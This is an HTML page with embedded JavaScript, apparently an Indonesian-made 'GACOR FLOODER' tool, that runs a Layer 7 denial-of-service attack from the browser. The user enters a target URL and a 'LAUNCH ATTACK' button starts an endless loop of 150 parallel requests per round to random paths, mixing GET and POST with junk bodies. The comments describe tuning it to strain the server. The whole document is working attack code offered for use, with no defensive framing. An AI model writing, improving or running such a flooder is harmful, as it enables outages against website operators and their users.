<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ GACOR DESTROYER v4 ⚡</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
        .panel { border: 3px solid #f00; margin: 20px auto; width: 90%; max-width: 500px; padding: 20px; background: rgba(10,0,0,0.9); box-shadow: 0 0 30px #f00; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #f00; color: #fff; font-weight: bold; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
        .stat-card { background: #1a1a1a; padding: 10px; border: 1px solid #333; }
        .stat-val { font-size: 20px; color: yellow; font-weight: bold; }
        button { width: 100%; padding: 15px; font-size: 20px; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; transition: 0.3s; }
        #fire-btn { background: #f00; color: #fff; box-shadow: 0 0 15px #f00; }
        #fire-btn:hover { background: #fff; color: #f00; }
        .monitor { background: #050505; border: 1px solid #222; height: 120px; overflow: hidden; font-size: 10px; color: #0f0; text-align: left; padding: 10px; margin-top: 15px; }
        .glitch { animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 0); } 50% { transform: translate(-1px, 0); } 100% { transform: translate(1px, 0); } }
    </style>
</head>
<body>

    <div class="panel">
        <h1 class="glitch" style="color: #f00;">⚡ GACOR FLOODER ⚡</h1>
        <input type="text" id="target" placeholder="https://target-victim.com/">
        
        <div class="stats-grid">
            <div class="stat-card">REQUESTS<br><span id="count" class="stat-val">0</span></div>
            <div class="stat-card">LOAD<br><span id="load" class="stat-val">0 MB</span></div>
        </div>

        <button id="fire-btn" onclick="toggleAttack()">LAUNCH ATTACK</button>
        
        <div class="monitor" id="log">Status: Awaiting Command...</div>
        <div style="font-size: 10px; color: #444; margin-top: 10px;">Powered by Yanz-Exploit (Layer 7 Hybrid)</div>
    </div>

    <script>
        let attacking = false;
        let totalRequests = 0;
        let totalData = 0;

        async function toggleAttack() {
            const target = document.getElementById('target').value;
            if (!target.startsWith('http')) return alert("Pake http:// atau https://!");

            attacking = !attacking;
            const btn = document.getElementById('fire-btn');

            if (attacking) {
                btn.innerHTML = "STOP ATTACK";
                btn.style.background = "#555";
                addLog("!!! ATTACK INITIALIZED !!!");
                startBurst(target);
            } else {
                location.reload();
            }
        }

        async function startBurst(target) {
            while (attacking) {
                let cluster = [];
                // Kirim 150 request paralel per satu putaran loop
                for (let i = 0; i < 150; i++) {
                    cluster.push(hit(target));
                }
                await Promise.allSettled(cluster);
            }
        }

        async function hit(target) {
            // Teknik 404 Gacor: Bikin path acak biar server mikir keras
            const randomPath = Math.random().toString(36).substring(2, 10);
            const finalUrl = target + (target.endsWith('/') ? '' : '/') + randomPath + "?bypass=" + Math.random();

            try {
                // Mix metode GET & POST biar server makin pusing
                const method = Math.random() > 0.5 ? 'GET' : 'POST';
                const bodyData = method === 'POST' ? JSON.stringify({ junk: "x".repeat(2000) }) : null;

                await fetch(finalUrl, {
                    method: method,
                    mode: 'no-cors',
                    cache: 'no-store',
                    body: bodyData,
                    headers: { 'Content-Type': 'application/json' }
                });

                totalRequests++;
                if (method === 'POST') totalData += 2; // Estimasi 2KB per POST
                updateUI();
            } catch (e) {
                totalRequests++;
                updateUI();
            }
        }

        function updateUI() {
            document.getElementById('count').innerText = totalRequests.toLocaleString();
            document.getElementById('load').innerText = (totalData / 1024).toFixed(2) + " MB";
            if (totalRequests % 100 === 0) {
                addLog(`[SYSTEM] Bursting to server... ${totalRequests} Packets Sent`);
            }
        }

        function addLog(msg) {
            const log = document.getElementById('log');
            log.innerHTML = `> ${msg}<br>` + log.innerHTML;
        }
    </script>
</body>
</html>
